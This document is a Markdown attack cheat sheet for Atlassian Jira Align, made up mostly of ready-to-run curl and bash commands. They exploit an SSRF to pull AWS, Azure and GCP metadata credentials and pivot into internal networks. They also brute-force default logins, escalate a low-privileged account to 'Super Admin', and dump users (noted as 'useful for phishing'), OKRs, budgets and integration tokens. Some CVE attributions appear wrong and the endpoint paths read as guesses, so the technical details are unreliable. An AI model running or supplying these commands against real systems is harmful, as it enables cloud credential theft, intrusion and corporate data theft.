# Jira Align (formerly AgileCraft)

## What is it?
Jira Align is Atlassian's enterprise agile planning platform (acquired from AgileCraft in 2019). It connects business strategy to technical execution — stores OKRs, roadmaps, PI plans, financial data, and portfolio-level strategy. Extremely high-value target in enterprise engagements: compromising Jira Align gives access to the organization's entire strategic planning data.

Attack surface: critical pre-auth SSRF (CVE-2022-36803 CVSS 10.0), privilege escalation CVEs, API abuse, sensitive data exposure.

Hosted at: `*.jiraalign.com` (cloud) or self-hosted.

---

## Ports

| Port | Protocol | Service |
|------|----------|---------|
| 443 | TCP | HTTPS (cloud: *.jiraalign.com) |
| 8080 | TCP | Self-hosted HTTP |
| 8443 | TCP | Self-hosted HTTPS |

---

## Enumeration

```bash
# Identify Jira Align instance
# Cloud: https://<company>.jiraalign.com
# Self-hosted: may be at /jiraalign/ path or dedicated subdomain

# Version check
curl -sk https://<target>/api/version
curl -sk https://<target>/rest/api/version

# Check for login page
curl -sk https://<target>/login | grep -i 'jira align\|agilecraft\|atlassian'

# Common cloud subdomains to try
for sub in jiraalign align agile planning portfolio; do
  curl -sk -o /dev/null -w "%{http_code}" "https://$sub.<company>.com" | grep -v "000" && echo " $sub.<company>.com"
done

# Shodan
http.title:"Jira Align" ssl.cert.subject.cn:"jiraalign.com"
```

---

## CVEs

| CVE | CVSS | Description | Impact |
|-----|------|-------------|--------|
| CVE-2022-36803 | 10.0 | Pre-auth SSRF — any URL fetchable by server | SSRF / Cloud credential theft |
| CVE-2023-22505 | High | Privilege escalation — low-priv user → admin | Vertical privesc |
| CVE-2023-22508 | High | Privilege escalation via broken access control | Vertical privesc |
| CVE-2022-36804 | N/A | Sensitive data exposure via unauthenticated endpoints | Info Disc |

---

## CVE-2022-36803 — Pre-Auth SSRF (CVSS 10.0)

```bash
# Critical SSRF — no authentication required
# Server fetches any URL on behalf of attacker

# Check if vulnerable
curl -sk "https://<target>/jiraalign/rest/request-proxy?url=http://169.254.169.254/"

# AWS IMDS via Jira Align SSRF
curl -sk "https://<target>/rest/request-proxy?url=http://169.254.169.254/latest/meta-data/"
curl -sk "https://<target>/rest/request-proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
ROLE=$(curl -sk "https://<target>/rest/request-proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
curl -sk "https://<target>/rest/request-proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"

# Azure IMDS
curl -sk "https://<target>/rest/request-proxy?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/"

# GCP metadata
curl -sk "https://<target>/rest/request-proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Internal network pivoting
curl -sk "https://<target>/rest/request-proxy?url=http://10.0.0.1:8080/"
curl -sk "https://<target>/rest/request-proxy?url=http://internal-jira:8080/rest/api/2/serverInfo"
curl -sk "https://<target>/rest/request-proxy?url=http://localhost:8080/jira/secure/ViewProfile.jspa"

# Read internal Jira/Confluence via SSRF
curl -sk "https://<target>/rest/request-proxy?url=http://jira.internal/rest/api/2/user/search?username="

# Alternative endpoint variants (try all)
for ep in "rest/request-proxy" "api/request-proxy" "jiraalign/rest/request-proxy" "v1/request-proxy"; do
  echo "=== $ep ==="
  curl -sk "https://<target>/$ep?url=http://169.254.169.254/latest/meta-data/"
done
```

---

## Authentication & API Access

```bash
# Login
curl -sk -X POST "https://<target>/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin@company.com","password":"password"}' \
  -c cookies.txt -v 2>&1 | grep -i 'set-cookie\|token\|session'

# API token auth (if API key available)
curl -sk "https://<target>/rest/api/users" \
  -H "Authorization: Bearer <api-token>"

# Check for default/weak credentials
for cred in "admin:admin" "admin:password" "admin:Jira1234" "align:align"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  resp=$(curl -sk -X POST "https://<target>/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"$pass\"}")
  echo "$cred: $resp" | grep -v "Invalid\|error"
done
```

---

## CVE-2023-22505 / CVE-2023-22508 — Privilege Escalation

```bash
# Low-privileged user → admin via broken access control
# Affects Jira Align < 10.109.2 (22505) and < 10.109.3 (22508)

# Check current user permissions
curl -sk "https://<target>/rest/api/currentUser" \
  -H "Authorization: Bearer <low-priv-token>" | jq '{role:.role, permissions:.permissions}'

# Attempt to access admin API endpoints with low-priv token
curl -sk "https://<target>/rest/api/admin/users" \
  -H "Authorization: Bearer <low-priv-token>"

# Attempt role escalation
curl -sk -X PUT "https://<target>/rest/api/users/<your-user-id>" \
  -H "Authorization: Bearer <low-priv-token>" \
  -H "Content-Type: application/json" \
  -d '{"role":"Super Admin"}'

# Check for IDOR in user role modification
curl -sk -X PATCH "https://<target>/rest/api/users/<victim-id>/role" \
  -H "Authorization: Bearer <low-priv-token>" \
  -H "Content-Type: application/json" \
  -d '{"role":"Administrator"}'
```

---

## Data Enumeration (Authenticated)

Jira Align stores highly sensitive strategic data — OKRs, roadmaps, financials, personnel.

```bash
# List all programs (top-level organizational units)
curl -sk "https://<target>/rest/api/programs" \
  -H "Authorization: Bearer <token>" | jq '.[].name'

# List all portfolios
curl -sk "https://<target>/rest/api/portfolios" \
  -H "Authorization: Bearer <token>"

# List OKRs (Objectives & Key Results)
curl -sk "https://<target>/rest/api/objectives" \
  -H "Authorization: Bearer <token>" | jq '.[] | {title:.title, description:.description}'

# List epics (feature roadmap)
curl -sk "https://<target>/rest/api/epics" \
  -H "Authorization: Bearer <token>"

# List all users (email + roles — useful for phishing)
curl -sk "https://<target>/rest/api/users?limit=1000" \
  -H "Authorization: Bearer <token>" | \
  jq '.[] | {name:.fullName, email:.email, role:.role}'

# Budget/financial data (if financial module enabled)
curl -sk "https://<target>/rest/api/budgets" \
  -H "Authorization: Bearer <token>"

# PI (Program Increment) plans — development roadmap
curl -sk "https://<target>/rest/api/pi?limit=100" \
  -H "Authorization: Bearer <token>"

# Teams and members
curl -sk "https://<target>/rest/api/teams" \
  -H "Authorization: Bearer <token>"

# Strategic themes
curl -sk "https://<target>/rest/api/strategicDrivers" \
  -H "Authorization: Bearer <token>"
```

---

## API Endpoint Discovery

```bash
# Jira Align REST API base paths
BASE="https://<target>"

# Common API endpoints to probe
endpoints=(
  "/rest/api/users"
  "/rest/api/programs"
  "/rest/api/portfolios"
  "/rest/api/epics"
  "/rest/api/features"
  "/rest/api/stories"
  "/rest/api/objectives"
  "/rest/api/currentUser"
  "/rest/api/config"
  "/rest/api/admin/users"
  "/rest/api/integrations"
  "/rest/api/webhooks"
  "/api/version"
)

for ep in "${endpoints[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE$ep" -H "Authorization: Bearer <token>")
  echo "$code $ep"
done

# Check for exposed Swagger/OpenAPI docs
curl -sk "$BASE/swagger-ui.html"
curl -sk "$BASE/api-docs"
curl -sk "$BASE/v2/api-docs"
curl -sk "$BASE/rest/api"
```

---

## Integration Abuse

Jira Align integrates with Jira Software, Confluence, and other tools via OAuth/API keys stored server-side.

```bash
# List configured integrations (admin)
curl -sk "https://<target>/rest/api/integrations" \
  -H "Authorization: Bearer <admin-token>" | jq '.[] | {type:.type, config:.config}'

# Look for Jira Software integration credentials
# These may be stored API tokens with access to all Jira projects
curl -sk "https://<target>/rest/api/admin/integrations/jira" \
  -H "Authorization: Bearer <admin-token>"

# Check webhook configurations (may reveal internal URLs)
curl -sk "https://<target>/rest/api/webhooks" \
  -H "Authorization: Bearer <token>"

# SSRF via webhook — create webhook pointing to internal target
curl -sk -X POST "https://<target>/rest/api/webhooks" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-service/","events":["epic.created"]}'
```

---

## Dangerous Configurations

| Config | Risk |
|--------|------|
| Unpatched < 10.109.x | CVE-2022-36803 SSRF (CVSS 10.0) — pre-auth cloud credential theft |
| Public registration enabled | Anyone can create account → access strategic data |
| All-users read on OKRs/roadmaps | Entire company strategy readable by any employee |
| Integration API tokens with broad scope | Lateral movement to Jira/Confluence |
| Admin API not restricted to internal IPs | Remote admin via stolen token |
| Financial data accessible to all users | Revenue, budget, headcount exposed |
| Webhooks without validation | SSRF to internal services |

---

## Quick Reference

```bash
# CVE-2022-36803 SSRF — pre-auth (CVSS 10.0)
curl -sk "https://<target>/rest/request-proxy?url=http://169.254.169.254/latest/meta-data/"

# AWS creds via SSRF
ROLE=$(curl -sk "https://<target>/rest/request-proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
curl -sk "https://<target>/rest/request-proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"

# User enumeration (authenticated)
curl -sk "https://<target>/rest/api/users?limit=1000" \
  -H "Authorization: Bearer <token>" | jq '.[] | {name:.fullName, email:.email, role:.role}'

# OKR / strategic data dump
curl -sk "https://<target>/rest/api/objectives" \
  -H "Authorization: Bearer <token>"

# Privesc attempt (CVE-2023-22505)
curl -sk -X PUT "https://<target>/rest/api/users/<id>" \
  -H "Authorization: Bearer <low-priv-token>" \
  -H "Content-Type: application/json" \
  -d '{"role":"Super Admin"}'
```
